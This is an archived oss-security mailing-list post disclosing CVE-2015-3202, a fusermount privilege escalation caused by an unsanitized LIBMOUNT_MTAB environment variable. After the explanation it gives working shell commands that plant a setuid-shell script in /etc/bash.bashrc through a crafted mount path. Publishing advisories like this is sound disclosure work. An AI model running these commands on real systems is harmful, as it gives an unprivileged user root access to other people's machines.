X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1696" "Thursday" "21" "May" "2015" "09:55:16" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkJiPqAgng68xYMNfUXUfoxsu9uUe0Civgr7sXG_n_0O_Q@mail.gmail.com>" "40" "[oss-security] CVE-2015-3202 fuse privilege escalation" nil nil nil "5" "2015052116:55:16" "[oss-security] CVE-2015-3202 fuse privilege escalation" (number mark "        taviso@googl May 21   40/1696  " thread-indent "\"[oss-security] CVE-2015-3202 fuse privilege escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 27657 invoked by uid 550); 21 May 2015 16:55:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 26577 invoked from network); 21 May 2015 16:55:49 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to:content-type;
        bh=gOseiyGaxeQtxJAkbcOsnfparRy4Na9q+YivrLmxa30=;
        b=lvqRKjEBgsFTQNPCYmEDU4awlEnMZEMHNcGyJNe88Mgo96M6G0B5Gag140SqbasruD
         wMr+0AW+kVIzSe6+ad0sMraMZxYo6qrbohfobu/cSkMQCyTl1+r5vt7lvhBIPxYrpmoK
         por1Ueg/ybgX0atE+xx+Xnpy8HONPLDdg44bFwFwrdHYw9L8ZoPvCNFWJUOYMnNezid8
         M/r5OuJVUntaueYDobnLIrmZmWPeDuOgfFkNUOkwu6GbWtnHF50Hw6tlOmA7i7uK2/oN
         iC8OJqfnGNkzPoC140zI8sRuRatRTHLMPRNBBS/oCwzUP/auk1Ij6JhCilWPaRZoTNAP
         YIUQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
         :content-type;
        bh=gOseiyGaxeQtxJAkbcOsnfparRy4Na9q+YivrLmxa30=;
        b=hi5upuSQnp7CQaUF1sC/wWqXTSCnIbZWRn40kLaJmyVXmHVp+TziSkBBKYAgbf3U6p
         HSsnE3WOLeT0czf34UJeHwsVrXe37yeUGzMjmpUwEZpf+X4+GM0Izs5TumRhOBeaaT8E
         Gs7XlN3pm5Dqc8unl06Br6wItX20leVKOoVM9A6MPhh45D0kJAonHAaEHwMEJMRfnHqc
         WUAXAu9CT54dYwOxpm3UHMolG9viLtYcuZjNlkEsOl8f73DMQHLQNjgdPs8aE88pW2rQ
         9GLNyjZKZz0hR+6GTbuvhMJFlwVQf+XPYtes+UDuvznLnRtDxn/NBgsDI81D1cMGqGko
         sJ+g==
X-Gm-Message-State: ALoCoQlJtoiFRX3mUAQ1jr0Q5lw0FbVRGV1y63MFWtq+HFqCOKFbb0sCP8wNaUZCK+GF5NAEBl9q
X-Received: by 10.55.33.40 with SMTP id h40mr8408883qkh.69.1432227337431; Thu,
 21 May 2015 09:55:37 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAJ_zFkJiPqAgng68xYMNfUXUfoxsu9uUe0Civgr7sXG_n_0O_Q@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Date: Thu, 21 May 2015 09:55:16 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2015-3202 fuse privilege escalation
To: oss-security@lists.openwall.com

Hello, this was discussed on the distros list last week.

The fusermount binary calls setuid(geteuid()) to reset the ruid when
it invokes /bin/mount so that it can use privileged mount options that
are normally restricted if ruid != euid. That's acceptable (but scary)
in theory, because fusermount can sanitize the call to make sure it's
safe.

http://sources.debian.net/src/fuse/2.9.3-15/util/mount_util.c/?hl=99#L99

However, because mount thinks it's being invoked by root, it allows
access to debugging features via the environment that would not
normally be safe for unprivileged users and fusermount doesn't
sanitize them.

Therefore, the bug is that the environment is not cleared when calling
mount with ruid=0. One debugging feature available is changing the
location of /etc/mtab by setting LIBMOUNT_MTAB, which can be abused to
overwrite arbitrary files.

This can be exploited like so.

$ printf "chmod 4755 /bin/dash" > /tmp/exploit && chmod 755 /tmp/exploit
$ mkdir -p '/tmp/exploit||/tmp/exploit'
$ LIBMOUNT_MTAB=/etc/bash.bashrc  _FUSE_COMMFD=0 fusermount
'/tmp/exploit||/tmp/exploit'
fusermount: failed to open /etc/fuse.conf: Permission denied
sending file descriptor: Socket operation on non-socket
$ cat /etc/bash.bashrc
/dev/fuse /tmp/exploit||/tmp/exploit fuse rw,nosuid,nodev,user=taviso 0 0

Then simply wait for root to login, or alternatively overwrite
/etc/default/locale and wait for cron to run a script that sources it.
That means root wouldn't have to log in, but you would have to wait
around until midnight to check if it worked.

Tavis.

P.S. Just for fun, I also came up with a version that fits in a tweet
https://twitter.com/taviso/status/601370527437967360
